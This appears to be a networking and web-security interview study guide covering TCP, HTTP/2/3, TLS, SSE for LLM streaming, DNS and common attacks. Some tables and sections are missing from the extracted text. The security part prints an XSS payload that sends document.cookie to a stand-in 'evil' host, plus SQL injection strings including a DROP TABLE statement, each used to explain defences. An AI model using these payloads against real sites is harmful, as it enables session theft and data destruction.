01Network models — the layer cake

Networking is layered so each level only worries about its own job and treats the layer below as a pipe. Two models: the academic OSI 7-layer and the practical TCP/IP 4-layer that the internet actually runs.

TCP/IP (4)≈ OSIJobExamples
ApplicationApp + Presentation + SessionWhat the data meansHTTP, DNS, TLS, WebSocket
TransportTransportEnd-to-end delivery between processes (ports)TCP, UDP
InternetNetworkRoute packets host-to-host across networksIP, ICMP (ping)
LinkData-link + PhysicalMove frames on the local wireEthernet, ARP, Wi-Fi
Mailing a letter maps the four layers cleanly — top → bottom, each wrapping the one above (encapsulation):
  • Application (HTTP/DNS) = the letter's content, plus both sides agreeing on a language to read it — the meaning.
  • Transport (TCP/UDP, ports) = sealing it in an envelope addressed to a specific person/department in the building (port = which process). TCP = registered mail with a return receipt (guaranteed, re-sent if lost); UDP = a postcard (drop it and hope).
  • Internet (IP) = the building's street address (IP), which the postal network routes hop by hop to the right city.
  • Link (Ethernet/ARP, MAC) = the actual trucks/carriers moving it between two adjacent stops, using local "which door" info (MAC); ARP = asking "which mailbox is this?" on the local street.
Know where things live: HTTP is application-layer, TCP/UDP are transport-layer (they use ports), IP is the internet/network layer (it uses IP addresses), and a MAC address lives at the link layer. A common question: "is a Socket a protocol?" — no, it's an API your app uses to talk to the transport layer.

02TCP vs UDP

The two transport protocols. TCP is a reliable, ordered, connection-oriented stream; UDP is a fire-and-forget datagram with almost no guarantees — but tiny and fast.

TCPUDP
ConnectionConnection-oriented (handshake first)Connectionless (just send)
Reliable / orderedYes — acks + retransmit + sequencingNo — may drop, dup, reorder
Flow / congestion controlYesNo
Header20+ bytes8 bytes
ShapeByte stream (no message boundaries)Discrete datagrams (boundaries kept)
Use forWeb, APIs, files, DB — correctness mattersDNS, video/voice, gaming — speed > perfection
TCP is a phone call: you dial, both say "hello?" (handshake), and you confirm you're heard ("...right?", "yeah"). UDP is shouting across a room: instant, no setup — but you never know if they caught every word.
The "sticky packet" (粘包) gotcha: because TCP is a byte stream with no message boundaries, two sends can arrive glued together (or split). The app must frame messages itself — by a length prefix, a delimiter, or fixed-size records. UDP doesn't have this problem (each datagram is one message).

03TCP three-way handshake

Before any data, TCP sets up a connection and synchronizes sequence numbers both ways. It takes three messages:

sequenceDiagram participant C as Client participant S as Server Note over C: CLOSED → SYN_SENT C->>S: ① SYN (seq=x) Note over S: LISTEN → SYN_RCVD S->>C: ② SYN+ACK (seq=y, ack=x+1) Note over C: → ESTABLISHED C->>S: ③ ACK (ack=y+1) Note over S: → ESTABLISHED

Why three, not two?

Two terms first. An "old" (historical) connection = a SYN from a previous connection that got delayed in the network and turns up late. An RST ("reset") = a TCP segment that means "abort — there's no valid connection here", tearing it down immediately (unlike the graceful FIN close).

The third handshake exists mainly to handle exactly that stale SYN. Three reasons (referencing ① ② ③ above):

  1. Reject old / duplicate connections — the main reason. Say the client's first ① SYN (seq=90) gets stuck in the network, so it times out and sends a new ① SYN (seq=100). If the old seq=90 SYN later reaches the server, the server replies ② SYN-ACK (ack=91). The client sees ack=91 but is expecting 101 (it sent seq=100), realizes this is a stale connection, and sends an RST instead of ③ — so the server drops it and never opens a zombie. A two-way handshake has no third leg, so the server would wrongly establish that old connection.
  2. Synchronize both sequence numbers. Each side's initial seq must be acked by the other: ① carries the client's seq; ② acks it and carries the server's seq; ③ acks the server's. That's four logical confirmations, but ②'s ACK and SYN merge into one packet → three messages. (After only two, the server's seq is still unacknowledged.)
  3. Avoid wasting resources. With two handshakes the server would open a connection (allocate buffers) the instant it sees a SYN — including duplicate/retransmitted SYNs — piling up wasted half-open connections. The ③ ACK confirms the client is really there before the server commits.
SYN flood: an attacker sends many SYNs but never the final ACK, filling the half-open (SYN) queue. Mitigate with SYN cookies (don't allocate state until the ACK returns), a bigger backlog, or shorter SYN-ACK retries.

The two queues behind a handshake

While connections are being set up, the kernel holds two queues:

QueueHoldsFilled / drained
Half-connection (SYN queue)connections that got ① and replied ②, but haven't seen ③ yet (state SYN_RCVD)filled by ①; an entry moves out when ③ arrives
Full-connection (accept queue)fully established connections waiting for the app to accept() themfilled when ③ arrives; drained by accept()

If the app is slow to accept(), the accept queue fills and new connections get dropped. A SYN flood attacks the other queue — floods of ① with no ③ pile up in the SYN queue; SYN cookies defeat it by encoding the connection state into ②'s sequence number and rebuilding it from the returning ③, so no memory is held until ③ comes back.

When a handshake segment is lost

LostWhat happens
① SYNThe client times out and retransmits the SYN (tcp_syn_retries), with exponential backoff.
② SYN-ACKBoth sides retransmit: the client re-sends ① (it never saw ②), the server re-sends ② (tcp_synack_retries).
③ ACKThe server stays in SYN_RCVD and retransmits ②; the client (already ESTABLISHED) re-ACKs — or its first data segment carries the ACK and fixes it.

04TCP four-way wave & TIME_WAIT

Closing takes four messages because TCP is full-duplex — each side closes its own direction independently. The side that sends data may still have some to flush after the other side is done.

sequenceDiagram participant C as Client (active close) participant S as Server C->>S: 1. FIN Note over C: FIN_WAIT_1 S->>C: 2. ACK Note over S: CLOSE_WAIT (may still send) Note over C: FIN_WAIT_2 S->>C: 3. FIN Note over S: LAST_ACK C->>S: 4. ACK Note over C: TIME_WAIT (wait 2 MSL) Note over C,S: both → CLOSED

The connection states, decoded

StateSideMeaning
FIN_WAIT_1active closerSent my FIN, waiting for it to be ACKed.
FIN_WAIT_2active closerMy FIN was ACKed (my send half is closed); now waiting for the peer to send its FIN.
TIME_WAITactive closerGot the peer's FIN, sent the last ACK, now waiting 2 MSL.
CLOSE_WAITpassive closerGot the peer's FIN but not done sending yet. Many stuck here = an app bug: it forgot to close().
LAST_ACKpassive closerSent my own FIN, waiting for the final ACK.

FIN_WAIT splits into 1 and 2 because the peer's ACK and its FIN are usually separate messages — exactly why close takes four steps.

Why three handshakes but four waves? On connect, the server's SYN and ACK combine into one packet. On close, the server's ACK (of your FIN) and its own FIN usually can't combine — it sends the ACK immediately but may still have data to send before its own FIN, so they're separate.
Why TIME_WAIT, and why 2× MSL? The side that actively closes waits ~2 MSL (Maximum Segment Lifetime) before fully closing:
  1. The closer's last message is itself an ACK (acknowledging the peer's FIN) — it is not waiting to receive an ACK. If that ACK is lost, the peer (still waiting for it in LAST_ACK) retransmits its FIN; 2 MSL covers exactly one round (1 MSL for the ACK to be presumed lost + 1 MSL for the retransmitted FIN to return), so the closer is still alive to re-send that ACK. (Had it fully closed, it would reply RST and the peer could never close cleanly.)
  2. It lets stray old packets from this connection die out. A connection is identified by its 4-tuple (local IP+port, remote IP+port). If a delayed or retransmitted packet from the old connection is still wandering the network, and you immediately reuse the same port-pair for a new connection, that ghost packet could arrive with a seq that lands inside the new connection's receive window and be accepted as valid data → corruption. Waiting 2 MSL (MSL = the longest a packet can survive in transit) guarantees every old packet has expired first, so the reused port-pair starts clean.
The cost — port exhaustion (follow the chain): every outbound connection needs a local source port, taken from the ephemeral pool (only tens of thousands of ports). When a connection actively closes, that local port is pinned in TIME_WAIT for ~2 MSL (1–4 min) before it can be reused. So a machine that opens and closes a flood of short connections (classically, a service making many quick calls to a backend) piles up TIME_WAITs that slowly use up the whole ephemeral pool → eventually it can't open new outbound connections. The fix is to stop opening/closing so often — reuse connections with keep-alive / a connection pool — not to blindly disable TIME_WAIT, which exists for correctness. (This hits the side that initiates connections — e.g. a server acting as a client to a backend — not a plain listening port.)

05How TCP stays reliable (& polite)

TCP layers several mechanisms on top of unreliable IP:

Ordering & loss

Sequence numbers order bytes and detect gaps/duplicates; the receiver sends ACKs; unacked data is retransmitted (on timeout, or fast-retransmit after 3 duplicate ACKs).

Flow control

The receiver advertises a window (rwnd) — "I have this much buffer free" — so a fast sender can't overwhelm a slow receiver. A sliding window lets many bytes be in flight without waiting per-packet.

Congestion control — don't melt the network

Flow control protects the receiver; congestion control protects the network. The sender keeps a congestion window (cwnd) and probes for capacity:

Terms used below

TermMeaning
MSS · Maximum Segment SizeThe most data TCP puts in one segment (~1460 bytes on Ethernet). cwnd and ssthresh are counted in MSS units.
RTT · Round-Trip TimeThe time for a packet to go out and its ACK to come back.
cwnd · congestion windowThe sender's own estimate of how much unacked data it may currently put on the network.
ssthresh · slow-start thresholdThe line between the phases: below it cwnd grows exponentially, above it linearly.
rwnd · receive windowWhat the receiver advertises as free buffer. The sender actually uses min(cwnd, rwnd).
  1. Slow start: cwnd starts at 1 MSS and grows by 1 for every ACK — so it roughly doubles each RTT (exponential) until it reaches the threshold ssthresh.
  2. Congestion avoidance: past ssthresh, grow gently — +1/cwnd per ACK, i.e. about +1 MSS per RTT (linear).
  3. On loss — two cases: a timeout is treated as severe → ssthresh = cwnd/2 and cwnd drops all the way to 1 (restart slow start). 3 duplicate ACKs is milder (packets are still getting through) → ssthresh = cwnd/2, then cwnd = ssthresh + 3 (fast retransmit + fast recovery), and the sender resumes congestion avoidance, not slow start.
Two bits from above, unpacked. "+1/cwnd per ACK" is just the math that yields "+1 MSS per RTT": one RTT sends ~cwnd packets and gets ~cwnd ACKs, so adding 1/cwnd on each grows the window by exactly 1 MSS over the whole round (vs slow start, which adds 1 per ACK → +cwnd per RTT → doubling). Duplicate ACKs: TCP ACKs are cumulative — an ACK means "I have everything up to N, send N next." If packet N is lost but N+1, N+2, N+3 still arrive, each one makes the receiver repeat the same "send N" ACK — a duplicate. So 3 duplicate ACKs means N was lost but later packets are still getting through (they're what produced the duplicates) — the pipe is flowing, just patch the one gap (fast retransmit). A timeout means you heard nothing back — possibly the whole path is dead, so cwnd crashes to 1.

Start with cwnd = 1 MSS and ssthresh = 16. Each row is one RTT:

What happens at the loss (cwnd = 20) depends on how it was detected:

  • Timeout: ssthresh = 20/2 = 10, cwnd → 1. Slow-start again (1 → 2 → 4 → 8 → 10), then congestion avoidance (11, 12, …).
  • 3 duplicate ACKs: ssthresh = 20/2 = 10, cwnd → ssthresh + 3 = 13. Stay in congestion avoidance (13 → 14 → 15 → …) — no crash to 1.
Slow start is merging onto a highway: you accelerate hard while it's clear, then ease into a steady cruise (avoidance). A crash ahead (timeout) makes you crawl from a stop; a brief brake-light (dup ACKs) just makes you slow a bit.

Detecting a dead peer — TCP keepalive vs HTTP keep-alive

Two unrelated mechanisms share the name "keep-alive":

TCP keepaliveHTTP keep-alive
LayerTransport (the OS)Application (HTTP)
PurposeDetect a dead connection: after a long idle the OS sends probe packets; no reply after a few → drop itKeep the TCP connection open to reuse it for more requests (Connection: keep-alive), avoiding a fresh handshake each time
Knobstcp_keepalive_time / _intvl / _probes + the SO_KEEPALIVE socket optionkeepalive_timeout (e.g. in Nginx)

TCP keepalive's default (~2 hours idle) is far too slow for most apps, so services usually add their own application-layer heartbeat (a periodic ping/pong) to notice a dead peer within seconds.

06HTTP basics

HTTP is a stateless, text-based request/response protocol on top of TCP (default port 80; HTTPS 443). A request is a method + URL + headers + optional body; a response is a status code + headers + body.

Methods

GET vs POST: GET puts params in the URL (cached, bookmarkable, length-limited in practice — a browser/server cap, not an HTTP rule — and logged), POST in the body (not cached, for changes/large data). Semantically GET is read-only/idempotent and POST is not — that difference matters more than "where the data goes".

Status codes

ClassMeaningCommon

5xxServer error500 Internal Server Error (a bug/crash on the server) · 502 Bad Gateway (the gateway got an invalid reply from upstream) · 503 Service Unavailable (overloaded or down for maintenance) · 504 Gateway Timeout (upstream didn't reply in time)
301 vs 302, 307/308, and 502 vs 504 are favorites. 301 = permanent (browser caches the new URL), 302 = temporary. 307/308 are the strict versions that preserve the method and body (301/302 historically let clients turn a POST into a GET; 308 ≈ 301, 307 ≈ 302). 502 = the gateway got a bad reply from upstream; 504 = upstream didn't reply in time.

How HTTP knows where a message ends

HTTP rides on a TCP byte stream, so the receiver needs a rule to find the end of a body:

  • Content-Length — the sender declares the exact body size up front; the receiver reads that many bytes.
  • Transfer-Encoding: chunked — for when the size isn't known up front (streaming): the body is sent as size-prefixed chunks, terminated by a zero-size chunk.

Why it's needed — the "sticky packet" (粘包) problem. TCP is a pure byte stream: it guarantees the bytes arrive in order, but keeps no record of where one "message" ended and the next began. So two responses sent separately can arrive glued together in one read, or one response can be split across several reads. TCP won't fix this — it has no concept of a "message". So the application protocol must mark the boundaries itself, which is exactly what Content-Length and chunked do above. (Any TCP-based protocol faces this; UDP doesn't, because each datagram is already one self-contained message.)

Reverse proxy & load balancing (Nginx)

A reverse proxy like Nginx (an L7 / application-layer proxy) sits in front of your servers and spreads requests across them. Common algorithms:

  • Round-robin — each server in turn (default); weighted gives stronger servers more.
  • IP hash — hash the client IP so a client always lands on the same server (cheap session stickiness).
  • Least-connections / least-time — pick the server with the fewest active requests / fastest responses.
  • URL hash — route by URL, for cache locality.

The HOL-blocking story ties it together: 1.1 multiplexes nothing (or pipelines fragilely) → 2 multiplexes streams but a lost TCP packet still stalls all streams (TCP-level HOL) → 3 moves to QUIC/UDP where streams are independent, so loss in one doesn't block the rest. That's the whole evolution in one sentence.
Multiplexing, by analogy. HTTP/1.1 is a single-lane road: one car (request) at a time — if the front one is slow, everyone behind waits. HTTP/2 multiplexing turns the same road into a multi-lane highway: many cars travel at once, each in its own lane, arriving independently. The "lanes" are stream IDs; each car is chopped into labelled pieces (frames) so cars from different lanes interleave on the wire and get reassembled by ID at the far end. (Catch: all lanes still share one TCP connection, so a single lost TCP packet stalls every lane — TCP-layer HOL blocking, which only HTTP/3 fixes.)

How one TCP connection carries many streams (and why 1.1 couldn't)

In HTTP/1.1 a message is one contiguous block of text with no per-chunk label — so on one connection you must finish one response before starting the next; mix two responses' bytes and the receiver can't tell them apart. (Pipelining sent requests back-to-back, but responses still came back whole and in order → HOL blocking.)

HTTP/2's trick — binary framing + stream IDs:

  1. Split every message into small binary frames.
  2. Tag each frame's header with a stream ID ("I belong to stream 3").
  3. Now frames from different streams can be interleaved on the one connection.
  4. The receiver reassembles by stream ID — stream 1's frames → response A, stream 3's → response B…
one TCP connection sends  S1S3S1S5S3S1 …
each box = one frame, tagged with its stream ID. The receiver sorts by tag → S1 = response A · S3 = response B · S5 = response C. HTTP/1.1's chunks have no such tag, so they can't be mixed.

So the whole secret is the tag on every frame. Adding it meant changing the wire format from text to framed binary — exactly what HTTP/2 did. And it all runs on top of TCP, which still delivers bytes strictly in order — so one lost TCP packet stalls every stream until it's retransmitted (TCP-layer HOL blocking, the reason HTTP/3 moves streams down into QUIC).

What QUIC is — and why HTTP/3 leaves TCP behind

QUIC (a name, not an acronym) is a new transport protocol built on top of UDP. So the stack changes: HTTP/1.1 and HTTP/2 run on TCP; HTTP/3 drops TCP and runs on QUIC → UDP. Why UDP? TCP's strict in-order delivery — the very thing causing TCP-layer HOL blocking — is baked into the OS kernel and can't be changed. UDP is a bare-bones "just send packets, no ordering, no reliability" protocol, so QUIC treats it as a blank canvas and rebuilds reliability, congestion control, multiple streams, and TLS on top — in user space, where it's free to do it better.

Why QUIC recovers from loss per-stream, and TCP can't:

TCP (HTTP/2)QUIC (HTTP/3)
What the transport seesone single ordered byte stream — it has no idea there are separate HTTP streams insidestreams are built into the transport — it knows which bytes belong to which stream
When a packet is lostto keep bytes in order the kernel holds back everything after the gap, including other streams' data → all streams stallonly the stream carried in that packet waits; the other streams keep being delivered
TCP  S1 S3 ✗ lost S1 S5 S3  →  the gap holds back everything after it — S1 & S5 wait too
QUIC S1 S3 ✗ lost S1 S5 S3  →  only S3 waits; S1 & S5 are delivered on time

Rebuilding the transport buys two more wins — both worth drawing.

Win 1 — one handshake, not two. On TCP the connection handshake must finish before TLS can even begin, so you pay two round trips before the first request goes out. Because TLS is built into QUIC, it folds the transport and TLS handshakes into one:

08HTTPS & TLS

HTTPS = HTTP over TLS. Plain HTTP is plaintext — anyone on the path can read or tamper with it (man-in-the-middle). TLS adds three things: encryption (privacy), integrity (tamper-proof), and authentication (you're really talking to that server, via its certificate).

sequenceDiagram participant C as Client participant S as Server C->>S: ClientHello (TLS versions, cipher list, client random) S->>C: ServerHello (chosen cipher, server random) + Certificate Note over C: verify cert — it carries the server's PUBLIC key Note over C,S: 🔑 ASYMMETRIC step — safely agree on a secret over the open line C->>S: key exchange — (RSA) pre-master encrypted with the server's public key Note over C,S: both derive the SAME session key (client random + server random + pre-master) C->>S: Finished (encrypted) S->>C: Finished (encrypted) Note over C,S: 🔒 SYMMETRIC from here — all app data uses the fast session key (AES)
The RSA key exchange, step by step — the asymmetric → symmetric handoff:
  1. The server's certificate carries its public key.
  2. The client generates a fresh random pre-master secret (new for this session), encrypts it with the server's public key, and sends it.
  3. Safe in transit: only the server's private key can decrypt it, so an eavesdropper who copies the message learns nothing.
  4. The server decrypts it with its private key — now both sides hold the pre-master.
  5. Both derive the same session key from pre-master + client random + server random, then switch to fast symmetric (AES) for all the real data.

Symmetric vs asymmetric — what they actually are

Symmetric (对称)Asymmetric (非对称)
Keysone shared key — the same key encrypts & decryptsa pair: a public key + a private key (mathematically linked)
Rulethe same key locks and unlocksencrypt with the public key → only the matching private key can decrypt (the reverse direction signs)

The pointbut: how do you hand the key to the other side over an open line without it being seen?lets a stranger send you a secret over an open line — only your private key opens it

Asymmetric = a mailbox with a public slot: anyone can drop a letter in (encrypt with the public key) but only the owner's key opens it (private key). You use it once to hand the owner a shared padlock combination; after that you both use the fast shared padlock (symmetric).
Why both asymmetric and symmetric? Asymmetric (RSA/ECDHE) is slow but lets two strangers agree on a secret over an open line; symmetric (AES) is fast. So TLS uses asymmetric crypto only to exchange a shared key, then encrypts the actual data with fast symmetric crypto.
RSA vs ECDHE key exchange — and "forward secrecy": with classic RSA, the client encrypts a pre-master secret with the server's public key and sends it; both sides then derive the session key from client-random + server-random + pre-master. The risk: if the server's private key ever leaks, anyone who recorded past traffic can decrypt it — no forward secrecy. ECDHE instead exchanges ephemeral Diffie-Hellman params (the certificate only signs them), so each session's key is independent and a later key leak can't decrypt old sessions — forward secrecy. TLS 1.3 dropped RSA key exchange entirely (ECDHE only) and is 1-RTT.
How does a certificate stop a MITM? The server's cert is signed by a CA your OS/browser already trusts. An attacker can copy the cert but can't forge the CA's signature for their own key, and can't present the real cert with a key they don't own — so the verification (or the key exchange) fails. The trust chain (root CA → intermediate → site) is the anchor.

How a server trusts it (no DB lookup): it re-computes the signature from the received header+payload using its secret; if that matches the signature in the token, it's authentic and untampered → trust the payload. Encoded ≠ encrypted: anyone can base64-decode and read the header & payload — the signature only detects tampering, it doesn't hide anything. So never put secrets (passwords, etc.) in the payload.

JWT's hard part is revocation. Because it's stateless, you can't "log someone out" server-side before the token expires. Fixes: keep expiry short + use a refresh token, or maintain a server-side blocklist (which reintroduces state). Classic trade-off: sessions are easy to revoke but need shared storage; JWTs scale statelessly but are hard to revoke.
Cookie vs localStorage: cookies auto-send to the server (and can be HttpOnly to hide from JS → safer against XSS); localStorage is bigger (~5MB), never auto-sent, but readable by any JS on the page. Store a JWT in an HttpOnly cookie + CSRF protection, or in memory — not plain localStorage if you can avoid it.

SSE and HTTP streaming aren't rivals. A long-lived HTTP response is HTTP streaming; SSE is just one specific text format of it (the data: … convention). So LLM token streams are SSE — they're simply consumed with fetch streaming instead of the EventSource API (why → the terminology note below). "Raw" HTTP streaming, with no SSE format, is for when you ship binary or your own framing.

What "duplex / two-way" means: simplex = one direction only (broadcast TV); half-duplex = both directions but one at a time (a walkie-talkie — you talk, then I talk); full-duplex = both directions at the same time (a phone call — both can speak at once). SSE and HTTP streaming are one-way (server → client); WebSocket and WebRTC are full-duplex.

SSE vs WebSocket — when? If you only need the server to push to the client (dashboards, notifications, LLM token streams), SSE is simpler: it's just HTTP, auto-reconnects, and works through proxies/HTTP-2. Reach for WebSocket when you need true two-way, low-latency traffic (chat, multiplayer, collaborative cursors).

How SSE auto-reconnects

Reconnection is built into the browser's EventSource, so you write none of it:

  • If the stream drops, the browser reconnects automatically after a delay — the server can set it with a retry: 5000 field (ms).
  • The server tags each event with an id:. On reconnect the browser sends the last one back in a Last-Event-ID request header, so the server can resume from where it left off — no missed events.

Choosing a real-time transport for LLM / AI features

What an LLM chat request actually looks like, end to end

It's a single round trip: one POST goes up with your message; the reply streams back token by token over the open response.

Why the POST + Authorization (the two ❌s above) matter so much:

  • POST carries the prompt. An LLM call sends a lot — the full prompt, the whole chat history, system message, tool definitions, parameters — kilobytes to megabytes of JSON. That can only ride in the request body, and GET has no body. (Stuffing it into the URL hits the ~2–8 KB length limit and leaks the content into every server/proxy log.) EventSource is GET-only → it literally can't send the prompt.
  • Authorization carries the API key. The API is paid and access-controlled; the key travels in the Authorization: Bearer … header. EventSource can't set headers → no clean way to authenticate (you'd be forced to put the key in the URL — logged, insecure).

The two layers — the client API vs the HTTP request it sends

fetch / EventSource is the JavaScript you write; the POST … in the diagram is the HTTP request that code produces. The method (GET/POST) is a property of the request — whether you can set it freely depends on which API you use:

// fetch — you set method / headers / body fetch('/v1/chat/completions', { method: 'POST', headers: { Authorization: 'Bearer sk-...' }, body: JSON.stringify({ messages, model, stream: true }) }) // → produces the POST in the diagram ✅
// EventSource — only a URL, nothing else new EventSource('/v1/chat/completions') // → always GET · no headers · no body → can't send the prompt or the key ❌

Takeaway: with fetch you choose method/headers/body, so you can POST the prompt and send the key. EventSource is locked to GET with no headers and no body — so "just switch to GET" isn't a one-word change: GET has no body, so the prompt has nowhere to go.

SSE's real costs (worth naming in an interview):

  • HTTP/1.1 connection limit — a browser allows only ~6 connections per domain, so many open tabs queue; HTTP/2 multiplexing fixes this.
  • Text-only — binary must be base64-encoded (+33% size).
  • Reconnect gap — between the old stream closing and the new POST opening, events can be dropped unless you track an id and resume.

Why not just always use WebSocket? It pins the connection to one server, so horizontal scaling needs a Redis pub/sub layer to fan messages out (more latency), and corporate proxies / firewalls often reject the Upgrade handshake outright. For one-way text streaming that's pure cost with no benefit.

For a real-time voice/video conversation (e.g. OpenAI's Realtime API), the tool is WebRTC — not any HTTP-based option. The governing principle: voice tolerates packet loss, but never latency — a lost 20 ms of audio is imperceptible, but waiting for TCP to retransmit it stalls everything after and breaks the conversation. The LLM-specific trick — semantic caching

A normal cache keys on an exact string match. A semantic cache embeds the question into a vector and matches by similarity, so "how do I reset my password?" and "I forgot my password, what now?" hit the same cached answer — skipping the model call entirely (cheaper + instant).

  • Similarity threshold is the knob: too high (0.99) and almost nothing matches; too low (0.7) and you return wrong answers. ~0.85–0.95 is typical.
  • TTL by volatility — volatile facts (weather, stock prices) expire in minutes; stable FAQs can live for days.
Not just a load balancer: a generic API gateway can't do token budgeting, semantic caching, or per-model cost attribution — those LLM-specific needs are why this exists. Popular implementations: LiteLLM (Python, 100+ models), One API (Go), Portkey, Bifrost (Rust).

Recursive vs iterative, and the cache order. The recursive resolver does the legwork: the browser asks it once and demands the final answer (a recursive query); the resolver then walks the hierarchy itself, each server handing back a referral to the next (iterative queries: root → TLD → authoritative). Before any network query, the name is checked against caches in order: browser cache → OS cache + the hosts file → router cache → ISP resolver cache — only a full miss triggers the hierarchy walk.
UDP or TCP — and why 512 bytes? Normal lookups use UDP (fast, one packet). The old DNS spec capped a UDP response at 512 bytes, because a bigger UDP packet gets fragmented at the IP layer, and fragmented UDP is fragile (lose one fragment and the whole reply fails; many firewalls drop fragments). So when a reply exceeds 512 bytes — a zone transfer (copying a whole zone between servers), a name with many records, or big DNSSEC signatures — DNS falls back to TCP (a reliable stream that carries any size). EDNS0 now lets UDP advertise a larger buffer to avoid TCP for moderately large replies; DoT/DoH tunnel DNS over TLS/HTTPS for privacy.

Step 3 in detail — ARP, Address Resolution Protocol (finding the next-hop MAC)

To put a packet on the wire, the link layer needs the MAC address of the next hop. Your target server is on a remote network, so the next hop is your gateway (router) — you know its IP (from your network config) but not its MAC. ARP resolves IP → MAC on the local network:

  1. Check the local ARP cache first — if the gateway's MAC is there, done.
  2. Otherwise broadcast an ARP request to ff:ff:ff:ff:ff:ff (every device on the LAN sees it): "Who has 192.168.1.1? Tell 192.168.1.50".
  3. The gateway (which owns that IP) unicasts back an ARP reply: "192.168.1.1 is at aa:bb:cc:dd:ee:ff".
  4. You cache it, set the Ethernet frame's destination MAC to the gateway's, and send — the router then forwards your packet onward.

Key point: ARP only works on the local segment (it's a broadcast). For a remote server you ARP the gateway's MAC, not the server's — the destination IP stays the server, but each hop's Ethernet frame uses the next hop's MAC.

Hit the layers in order and you'll never blank on this: DNS (app) → TCP handshake (transport) → TLS → HTTP request/response → render. Bonus points for mentioning caches at each DNS level, ARP for the local MAC, and keep-alive reusing the TCP connection for subsequent assets.

The three XSS types: Stored — the payload is saved on the server and served to other users (e.g. a malicious comment). Reflected — the payload is echoed straight back from the request (e.g. a search term in the URL). DOM-based — client-side JS writes attacker input into the page; the server never sees it, so server-side output-encoding won't catch it — you must sanitize in the JS too.

XSS — how it works, then how the defenses stop it

The attack: a page renders user input without escaping — e.g. a saved comment <script>fetch('//evil/?c='+document.cookie)</script> runs in every viewer's browser, stealing their cookie/session or acting as them. Defenses:

  • Output encoding / escaping — when you insert user data into a page, convert < > & " ' into HTML entities so the browser renders them as text, never as tags or script. The single most important defense — and it must match the context (HTML body vs attribute vs inline-JS vs URL each escape differently).
  • Content-Security-Policy (CSP) — a response header that whitelists where scripts may load from (e.g. script-src 'self'). Even if an attacker injects a <script>, the browser refuses to run inline or off-domain code — a safety net for when encoding is missed.
  • HttpOnly cookies — mark the session cookie unreadable from JavaScript, so an injected script can't steal it via document.cookie.
  • Input validation / sanitization — reject or strip dangerous markup on the way in (for rich text, run an allow-list HTML sanitizer). For DOM-based XSS you must also sanitize in the client JS, since the server never sees the data.

CSRF — how it works, then how the defenses stop it

The attack: you're logged into your bank; a malicious page auto-submits a hidden <form action="bank.com/transfer" method="POST"> — the browser attaches your bank cookie, so the transfer succeeds. The attacker never reads the response; they only need the side-effect to fire. Defenses:

  • SameSite cookies — SameSite=Lax (now the browser default) or Strict tells the browser not to attach the cookie to cross-site requests. No cookie ride → the forged request is unauthenticated. The strongest and simplest defense.
  • CSRF token — the server plants a random, per-session secret token in each form/page; a genuine request echoes it back, but the attacker's cross-site page can't read it (the same-origin policy blocks that). Missing or wrong token → rejected. Also called the synchronizer-token pattern.
  • Origin / Referer check — the server checks the request's Origin/Referer header matches its own domain. A fallback, since these headers can be absent.

SQL injection — how it works, then how to stop it

The attack: code builds a query by string-concatenation: "SELECT * FROM users WHERE name='" + input + "'". Input ' OR '1'='1 makes the WHERE always true (login bypass); '; DROP TABLE users;-- smuggles in a second statement. Defenses:

  • Parameterized queries / prepared statements — send the SQL and the data separately; the driver binds the value as pure data, never as executable SQL, so quotes in the input can't break out. The one defense that truly fixes it.
  • Least-privilege DB user — the app's account can't DROP or alter schema, shrinking the blast radius if something slips through.
  • Input validation + ORM — type/allow-list checks and ORMs (which parameterize by default) add depth — but are not a substitute for prepared statements.

DDoS — how it works, then how to stop it

The attack: a botnet (thousands of compromised machines) floods you to exhaust a resource — bandwidth (volumetric: UDP/ICMP flood), connection state (SYN flood — half-open handshakes), or CPU (expensive requests). Goal: legit users can't get through. Defenses:

  • Rate limiting — cap requests per IP / token / route so one source can't monopolize capacity.
  • CDN + Anycast — absorb and spread the flood across many edge nodes near the attackers, far from your origin.
  • WAF / scrubbing — a filter that drops malicious traffic patterns; providers (Cloudflare etc.) "scrub" the flood and forward only clean traffic.
  • Autoscale + blackhole — scale out under load; as a last resort, route the targeted IP to a null route ("blackhole") to protect everything else.
  • SYN cookies — for SYN floods specifically, the server encodes connection state into the SYN-ACK instead of allocating memory, so the half-open queue can't be filled.

DNS hijacking — how it works, then how to stop it

The attack: the attacker forges a DNS reply or poisons a resolver's cache so a name (bank.com) resolves to their IP; the victim types the right name but lands on a look-alike phishing site. Defenses:

  • DNSSEC — records are cryptographically signed, so a resolver can verify the answer is authentic and untampered, rejecting forged replies.
  • DoT / DoH — DNS over TLS / over HTTPS encrypts the query, so an on-path attacker can't read or alter it.
  • Trusted resolvers — use a reputable resolver and protect your own router/DNS settings (a common hijack point).
  • HTTPS + cert check is the backstop — even if DNS is fooled, the fake site can't present a valid certificate for the real domain, so the browser warns you.
XSS vs CSRF in one line: XSS = the site wrongly trusts data (runs injected script); CSRF = the site wrongly trusts the browser/cookie (acts on a forged request). XSS defense = encode output + CSP; CSRF defense = tokens + SameSite. Note an XSS hole can defeat most CSRF defenses, so fix XSS first.

15Rapid-fire cheat sheet

Layers

App (HTTP/DNS/TLS) · Transport (TCP/UDP, ports) · Internet (IP) · Link (Ethernet/ARP, MAC).

TCP

3-way handshake (sync seq both ways), 4-way wave (full-duplex), TIME_WAIT = 2 MSL. Reliable via seq/ack/retransmit; flow control = rwnd; congestion = cwnd (slow start → avoidance → fast recovery).

TCP vs UDP

TCP = reliable ordered stream (web/db). UDP = fast connectionless datagram (DNS/video/games).

HTTP

Stateless req/resp. 2xx ok · 3xx redirect · 4xx client · 5xx server. 1.1 keep-alive → 2 multiplexing/HPACK → 3 QUIC (no TCP HOL).

HTTPS

HTTP+TLS: asymmetric to exchange a key, symmetric for data; cert signed by a trusted CA stops MITM.

State & real-time

Session = stateful (shared store). JWT = stateless (signed, hard to revoke). SSE = server→client push. WebSocket = full-duplex.

When the client replies (its ACK, or data which also acks), the server reaches ESTABLISHED. If the client sends data, that data carries the ACK and fixes it immediately.
A server has tens of thousands of sockets stuck in TIME_WAIT. Cause and fix? HARD
TIME_WAIT is on whoever actively closes. A server doing lots of short connections (e.g. closing HTTP keep-alive aggressively, or being the side that closes) piles them up, exhausting ephemeral ports. Fixes: enable keep-alive / connection pooling so connections are reused, let the client close instead, tune tcp_tw_reuse for outbound — but don't just kill TIME_WAIT, it exists for correctness.
HTTP/2 multiplexes streams — so why does a lost packet still hurt, and how does HTTP/3 help? HARD
HTTP/2 removes application-layer HOL blocking, but all its streams still ride one TCP connection. TCP guarantees in-order bytes, so a single lost packet makes the kernel hold back every stream's data until it's retransmitted — TCP-layer HOL blocking. HTTP/3 runs on QUIC (over UDP), which tracks loss per-stream, so a loss in one stream doesn't stall the others.
